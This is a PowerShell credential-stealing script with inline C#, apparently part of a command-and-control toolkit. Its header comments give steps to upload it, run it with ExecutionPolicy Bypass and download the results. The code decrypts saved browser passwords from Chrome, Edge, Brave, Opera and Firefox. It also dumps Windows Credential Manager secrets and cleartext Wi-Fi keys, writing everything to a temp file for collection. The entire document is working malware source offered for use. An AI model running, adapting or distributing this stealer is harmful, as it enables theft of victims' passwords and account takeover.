# cred_steal.ps1 - Chrome / Edge / Firefox / CredMan / Wi-Fi credential dumper
# Run in TARGET USER SESSION (abdum, not SYSTEM) for DPAPI access.
# Output: C:\Windows\Temp\creds.txt
#
# Deploy:
#   upload /home/kali/turon-c2-src/bypass/cred_steal.ps1 C:\Windows\Temp\cs.ps1
#   powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\cs.ps1
#   download C:\Windows\Temp\creds.txt

$out = "C:\Windows\Temp\creds.txt"
"[+] Credential dump $(Get-Date)" | Out-File $out -Encoding UTF8

# Inline C#: DPAPI + AES-256-GCM (BCrypt) + SQLite3 B-tree reader
Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;

public static class BrowserStealer {

    // DPAPI
    [StructLayout(LayoutKind.Sequential)]
    struct CRYPT_BLOB { public uint cb; public IntPtr pb; }

    [DllImport("crypt32.dll", SetLastError=true)]
    static extern bool CryptUnprotectData(ref CRYPT_BLOB In, IntPtr Descr, IntPtr Entropy,
        IntPtr Reserved, IntPtr Prompt, uint Flags, ref CRYPT_BLOB Out);

    [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr hMem);

    public static byte[] DpDecrypt(byte[] data) {
        CRYPT_BLOB inp = new CRYPT_BLOB(), outp = new CRYPT_BLOB();
        inp.cb = (uint)data.Length;
        inp.pb = Marshal.AllocHGlobal(data.Length);
        Marshal.Copy(data, 0, inp.pb, data.Length);
        try {
            if (!CryptUnprotectData(ref inp, IntPtr.Zero, IntPtr.Zero,
                    IntPtr.Zero, IntPtr.Zero, 0, ref outp)) return null;
            byte[] r = new byte[outp.cb];
            Marshal.Copy(outp.pb, r, 0, (int)outp.cb);
            LocalFree(outp.pb);
            return r;
        } finally { Marshal.FreeHGlobal(inp.pb); }
    }

    // BCrypt AES-256-GCM
    [DllImport("bcrypt.dll")]
    static extern uint BCryptOpenAlgorithmProvider(out IntPtr h, string alg, string impl, uint fl);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptSetProperty(IntPtr h, string prop, byte[] val, uint cb, uint fl);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptGenerateSymmetricKey(IntPtr hAlg, out IntPtr hKey,
        IntPtr pbKeyObj, uint cbKeyObj, byte[] pbSecret, uint cbSecret, uint fl);
    [DllImport("bcrypt.dll")]
    static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbIn, uint cbIn,
        ref AUTH_INFO pAuth, byte[] pbIV, uint cbIV,
        byte[] pbOut, uint cbOut, out uint pcbResult, uint fl);
    [DllImport("bcrypt.dll")] static extern uint BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")] static extern uint BCryptCloseAlgorithmProvider(IntPtr h, uint fl);

    [StructLayout(LayoutKind.Sequential)]
    struct AUTH_INFO {
        public uint cbSize, dwInfoVersion;
        public IntPtr pbNonce;   public uint cbNonce;
        public IntPtr pbAuthData; public uint cbAuthData;
        public IntPtr pbTag;     public uint cbTag;
        public IntPtr pbMacCtx;  public uint cbMacCtx;
        public uint cbAAD; public ulong cbData; public uint dwFlags;
    }

    public static byte[] AesGcmDecrypt(byte[] key, byte[] nonce, byte[] ct, byte[] tag) {
        IntPtr hAlg, hKey;
        if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
        byte[] gcmMode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
        BCryptSetProperty(hAlg, "ChainingMode", gcmMode, (uint)gcmMode.Length, 0);
        if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0); return null;
        }
        IntPtr pN = Marshal.AllocHGlobal(nonce.Length);
        IntPtr pT = Marshal.AllocHGlobal(tag.Length);
        Marshal.Copy(nonce, 0, pN, nonce.Length);
        Marshal.Copy(tag,   0, pT, tag.Length);
        var ai = new AUTH_INFO();
        ai.cbSize = (uint)Marshal.SizeOf(ai);
        ai.dwInfoVersion = 1;
        ai.pbNonce = pN; ai.cbNonce = (uint)nonce.Length;
        ai.pbTag   = pT; ai.cbTag   = (uint)tag.Length;
        byte[] plain = new byte[ct.Length]; uint outLen;
        uint s = BCryptDecrypt(hKey, ct, (uint)ct.Length, ref ai, null, 0,
                               plain, (uint)plain.Length, out outLen, 0);
        Marshal.FreeHGlobal(pN); Marshal.FreeHGlobal(pT);
        BCryptDestroyKey(hKey); BCryptCloseAlgorithmProvider(hAlg, 0);
        return s == 0 ? plain : null;
    }

    // SQLite3 minimal B-tree leaf page reader
    static long GetVarint(byte[] d, ref int p) {
        long v = 0;
        for (int i = 0; i < 9 && p < d.Length; i++) {
            byte b = d[p++];
            v = (v << 7) | (b & 0x7FL);
            if ((b & 0x80) == 0) return v;
        }
        return v;
    }
    static int SerialSz(long t) {
        if (t == 0 || t == 8 || t == 9) return 0;
        if (t == 1) return 1; if (t == 2) return 2; if (t == 3) return 3;
        if (t == 4) return 4; if (t == 5) return 6;
        if (t == 6 || t == 7) return 8;
        if (t >= 12) return (int)((t - (t % 2 == 0 ? 12 : 13)) / 2);
        return 0;
    }

    // Returns list of [url, username, password_blob_b64]
    public static List<string[]> ReadLogins(string path) {
        var result = new List<string[]>();
        byte[] d;
        try { d = File.ReadAllBytes(path); } catch { return result; }
        if (d.Length < 100 || d[0] != 'S' || d[1] != 'Q' || d[2] != 'L') return result;

        int pgSz = (d[16] << 8) | d[17];
        if (pgSz == 1) pgSz = 65536;
        int nPg = d.Length / pgSz;

        for (int pg = 0; pg < nPg; pg++) {
            int pgOff = pg * pgSz;
            if (pgOff >= d.Length || d[pgOff] != 0x0D) continue;

            int nCells = (d[pgOff+3] << 8) | d[pgOff+4];
            int hdrBase = pg == 0 ? 100 : 0;

            for (int c = 0; c < nCells; c++) {
                int cPtrOff = pgOff + hdrBase + 8 + c * 2;
                if (cPtrOff + 1 >= d.Length) break;
                int cOff = pgOff + ((d[cPtrOff] << 8) | d[cPtrOff+1]);
                if (cOff <= 0 || cOff + 3 >= d.Length) continue;
                try {
                    int pos = cOff;
                    GetVarint(d, ref pos);
                    GetVarint(d, ref pos);

                    int hStart = pos;
                    int hLen = (int)GetVarint(d, ref pos);
                    int hEnd = hStart + hLen;
                    if (hEnd > d.Length) continue;

                    var types = new List<long>();
                    while (pos < hEnd) types.Add(GetVarint(d, ref pos));

                    int dp = hEnd;
                    var cells = new object[types.Count];
                    for (int fi = 0; fi < types.Count; fi++) {
                        int sz = SerialSz(types[fi]);
                        if (dp + sz > d.Length) break;
                        long t = types[fi];
                        if (t >= 13 && t % 2 == 1 && sz > 0)
                            cells[fi] = Encoding.UTF8.GetString(d, dp, sz);
                        else if (t >= 12 && t % 2 == 0 && sz > 0) {
                            byte[] b = new byte[sz]; Array.Copy(d, dp, b, 0, sz);
                            cells[fi] = b;
                        }
                        dp += sz;
                    }

                    string url = null, user = null;
                    byte[] blob = null;
                    foreach (var cell in cells) {
                        if (cell is string) {
                            string s = (string)cell;
                            if (url == null && (s.StartsWith("http") || s.StartsWith("android") || s.Contains("://")))
                                url = s;
                            else if (url != null && user == null)
                                user = s;
                        } else if (cell is byte[]) {
                            byte[] b2 = (byte[])cell;
                            if (b2.Length > 3 && blob == null) blob = b2;
                        }
                    }
                    if (url != null && blob != null)
                        result.Add(new string[] { url, user == null ? "" : user, Convert.ToBase64String(blob) });
                } catch {}
            }
        }
        return result;
    }

    // NSS Firefox decryption
    [DllImport("nss3.dll", EntryPoint="NSS_Init", CharSet=CharSet.Ansi)]
    public static extern int NSS_Init(string dir);
    [DllImport("nss3.dll", EntryPoint="NSS_Shutdown")]
    public static extern int NSS_Shutdown();

    [StructLayout(LayoutKind.Sequential)]
    public struct SECItem { public int type; public IntPtr data; public int len; }

    [DllImport("nss3.dll", EntryPoint="PK11SDR_Decrypt")]
    public static extern int PK11SDR_Decrypt(ref SECItem inp, ref SECItem outp, IntPtr cx);

    public static string NssDecrypt(byte[] enc, string profileDir) {
        try {
            NSS_Init(profileDir);
            SECItem inp = new SECItem { type=0, data=Marshal.AllocHGlobal(enc.Length), len=enc.Length };
            Marshal.Copy(enc, 0, inp.data, enc.Length);
            SECItem outp = new SECItem();
            if (PK11SDR_Decrypt(ref inp, ref outp, IntPtr.Zero) != 0 || outp.len <= 0) {
                NSS_Shutdown(); return null;
            }
            byte[] r = new byte[outp.len];
            Marshal.Copy(outp.data, r, 0, outp.len);
            NSS_Shutdown();
            return Encoding.UTF8.GetString(r);
        } catch { return null; }
    }
}
'@ -ReferencedAssemblies @() -EA 0

# Helpers

function Get-ChromeAesKey($local_state_path) {
    try {
        $ls  = Get-Content $local_state_path -Raw -EA Stop | ConvertFrom-Json
        $b64 = $ls.os_crypt.encrypted_key
        if (-not $b64) { return $null }
        $enc = [Convert]::FromBase64String($b64)
        $blob = $enc[5..($enc.Length-1)]
        return [BrowserStealer]::DpDecrypt($blob)
    } catch { return $null }
}

function Decrypt-ChromePassword($blob, $aesKey) {
    $blob = [byte[]]$blob
    if ($blob.Length -lt 15) { return '<short_blob>' }
    if ($blob[0] -eq 0x76 -and $blob[1] -eq 0x31 -and $blob[2] -eq 0x30) {
        if (-not $aesKey) { return '<needs_aes_key>' }
        $nonce = $blob[3..14]
        $full  = $blob[15..($blob.Length-1)]
        if ($full.Length -lt 17) { return '<too_short>' }
        $tag   = $full[($full.Length-16)..($full.Length-1)]
        $ct    = $full[0..($full.Length-17)]
        $plain = [BrowserStealer]::AesGcmDecrypt($aesKey, $nonce, $ct, $tag)
        if ($plain) { return [Text.Encoding]::UTF8.GetString($plain) }
        return '<aes_fail>'
    }
    $plain = [BrowserStealer]::DpDecrypt($blob)
    if ($plain) { return [Text.Encoding]::UTF8.GetString($plain) }
    return '<dpapi_fail>'
}

function Dump-Chromium($browser, $userDataDir) {
    $ls = "$userDataDir\Local State"
    if (-not (Test-Path $ls -EA 0)) {
        ("  [" + $browser + "] Local State not found: " + $userDataDir) | Out-File $out -Append -Encoding UTF8
        return
    }
    $aesKey = Get-ChromeAesKey $ls
    if (-not $aesKey) {
        ("  [" + $browser + "] AES key decrypt failed") | Out-File $out -Append -Encoding UTF8
    } else {
        ("  [" + $browser + "] AES key OK (" + $aesKey.Length + " bytes)") | Out-File $out -Append -Encoding UTF8
    }

    $profiles = @('Default','Profile 1','Profile 2','Profile 3','Guest Profile')
    foreach ($prof in $profiles) {
        $db = "$userDataDir\$prof\Login Data"
        if (-not (Test-Path $db -EA 0)) { continue }
        $tmp = "$env:TEMP\ld_$(Get-Random).db"
        try { [IO.File]::Copy($db, $tmp, $true) } catch { continue }

        $rows = [BrowserStealer]::ReadLogins($tmp)
        Remove-Item $tmp -Force -EA 0

        if ($rows.Count -eq 0) {
            ("  [" + $browser + "/" + $prof + "] 0 rows (no saved passwords or SQLite parse failed)") | Out-File $out -Append -Encoding UTF8
            continue
        }

        foreach ($row in $rows) {
            $url   = $row[0]
            $uname = $row[1]
            $blob  = [Convert]::FromBase64String($row[2])
            $cpwd  = Decrypt-ChromePassword $blob $aesKey
            ("[" + $browser + "] " + $url + " | " + $uname + " | " + $cpwd) | Out-File $out -Append -Encoding UTF8
        }
    }
}

function Dump-Firefox($profileDir) {
    $key4   = "$profileDir\key4.db"
    $logins = "$profileDir\logins.json"
    if (-not (Test-Path $key4 -EA 0) -or -not (Test-Path $logins -EA 0)) { return }

    $lj = $null
    try { $lj = Get-Content $logins -Raw | ConvertFrom-Json } catch { return }

    $nss3x86 = Get-Item 'C:\Program Files (x86)\Mozilla Firefox\nss3.dll' -EA 0
    $nss3x64 = Get-Item 'C:\Program Files\Mozilla Firefox\nss3.dll' -EA 0
    $ffDir = $null
    if ($nss3x64) { $ffDir = $nss3x64.DirectoryName }
    elseif ($nss3x86) { $ffDir = $nss3x86.DirectoryName }

    if ($ffDir) {
        $env:PATH = "$ffDir;$env:PATH"
        foreach ($l in $lj.logins) {
            try {
                $uBytes = [Convert]::FromBase64String($l.encryptedUsername)
                $pBytes = [Convert]::FromBase64String($l.encryptedPassword)
                $fu = [BrowserStealer]::NssDecrypt($uBytes, $profileDir)
                $fp = [BrowserStealer]::NssDecrypt($pBytes, $profileDir)
                if ($fu -or $fp) {
                    ("[Firefox] " + $l.hostname + " | " + $fu + " | " + $fp) | Out-File $out -Append -Encoding UTF8
                }
            } catch {}
        }
    } else {
        "[Firefox] nss3.dll not found - dumping raw for offline decrypt" | Out-File $out -Append -Encoding UTF8
        foreach ($l in $lj.logins) {
            $line = "[Firefox-raw] " + $l.hostname + " | user=" + $l.encryptedUsername + " | pass=" + $l.encryptedPassword
            $line | Out-File $out -Append -Encoding UTF8
        }
    }
}

# Main

# Wi-Fi passwords
"" | Out-File $out -Append -Encoding UTF8
"[WiFi]" | Out-File $out -Append -Encoding UTF8
$wlan_raw = netsh wlan show profiles 2>$null
if ($wlan_raw) {
    $wlan_raw | Select-String 'All User Profile\s*:\s*(.+)' | ForEach-Object {
        $ssid = $_.Matches[0].Groups[1].Value.Trim()
        $info = (netsh wlan show profile name="`"$ssid`"" key=clear 2>$null) -join "`n"
        $wm = [regex]::Match($info, 'Key Content\s+:\s+(.+)')
        $wkey = if ($wm.Success) { $wm.Groups[1].Value.Trim() } else { '<no key>' }
        ("[WiFi] " + $ssid + " | " + $wkey) | Out-File $out -Append -Encoding UTF8
    }
}

# Windows Credential Manager
"" | Out-File $out -Append -Encoding UTF8
"[CredMan]" | Out-File $out -Append -Encoding UTF8
try {
    Add-Type -Name CredDump -Namespace '' -MemberDefinition @'
[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
public struct CREDENTIAL {
    public int Flags,Type; public string TargetName,Comment;
    public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
    public int BlobSize; public IntPtr Blob;
    public int Persist,AttrCount; public IntPtr Attrs;
    public string Alias,UserName;
}
[DllImport("advapi32.dll",EntryPoint="CredEnumerateW",CharSet=CharSet.Unicode,SetLastError=true)]
public static extern bool Enum(string f,int fl,out int cnt,out IntPtr creds);
[DllImport("advapi32.dll")] public static extern void Free(IntPtr p);
'@ -ReferencedAssemblies @() -EA 0

    $cnt = 0; $pc = [IntPtr]::Zero
    if ([CredDump]::Enum($null, 1, [ref]$cnt, [ref]$pc)) {
        for ($i = 0; $i -lt $cnt; $i++) {
            $p = [Runtime.InteropServices.Marshal]::ReadIntPtr($pc, $i * [IntPtr]::Size)
            $c = [Runtime.InteropServices.Marshal]::PtrToStructure($p, [type][CredDump+CREDENTIAL])
            $cmPwd = '<no blob>'
            if ($c.BlobSize -gt 0) {
                $blob = New-Object byte[] $c.BlobSize
                [Runtime.InteropServices.Marshal]::Copy($c.Blob, $blob, 0, $c.BlobSize)
                $decrypted = [BrowserStealer]::DpDecrypt($blob)
                if ($decrypted) {
                    $ds = [Text.Encoding]::Unicode.GetString($decrypted)
                    if ($ds -match '^[\x20-\x7E]+$') {
                        $cmPwd = $ds
                    } else {
                        $cmPwd = '<binary_dpapi:' + [BitConverter]::ToString($decrypted).Replace('-','') + '>'
                    }
                } else {
                    $rs = [Text.Encoding]::Unicode.GetString($blob).TrimEnd("`0")
                    if ($rs.Length -gt 0 -and $rs -match '^[\x20-\x7E]+$') {
                        $cmPwd = $rs
                    } else {
                        $cmPwd = '<binary:' + [BitConverter]::ToString($blob).Replace('-','') + '>'
                    }
                }
            }
            ("[CredMan] " + $c.TargetName + " | " + $c.UserName + " | " + $cmPwd) | Out-File $out -Append -Encoding UTF8
        }
        [CredDump]::Free($pc)
    }
} catch {}

# Browser credentials
"" | Out-File $out -Append -Encoding UTF8

$users = Get-ChildItem C:\Users -Directory -Force -EA 0 |
    Where-Object { $_.Name -notin @('Public','Default','Default User','All Users') }

foreach ($u in $users) {
    "" | Out-File $out -Append -Encoding UTF8
    ("=== User: " + $u.Name + " ===") | Out-File $out -Append -Encoding UTF8

    Dump-Chromium 'Chrome' ($u.FullName + '\AppData\Local\Google\Chrome\User Data')
    Dump-Chromium 'Edge'   ($u.FullName + '\AppData\Local\Microsoft\Edge\User Data')
    Dump-Chromium 'Brave'  ($u.FullName + '\AppData\Local\BraveSoftware\Brave-Browser\User Data')
    Dump-Chromium 'Opera'  ($u.FullName + '\AppData\Roaming\Opera Software\Opera Stable')

    Get-ChildItem ($u.FullName + '\AppData\Roaming\Mozilla\Firefox\Profiles') -Directory -Force -EA 0 |
        ForEach-Object { Dump-Firefox $_.FullName }
}

Write-Host "[+] Credentials written to $out"
Get-Content $out -EA 0 | Where-Object { $_ -match '^\[(WiFi|CredMan|Chrome|Edge|Brave|Opera|Firefox)\]' } |
    Measure-Object | ForEach-Object { Write-Host "[+] $($_.Count) credential lines found" }
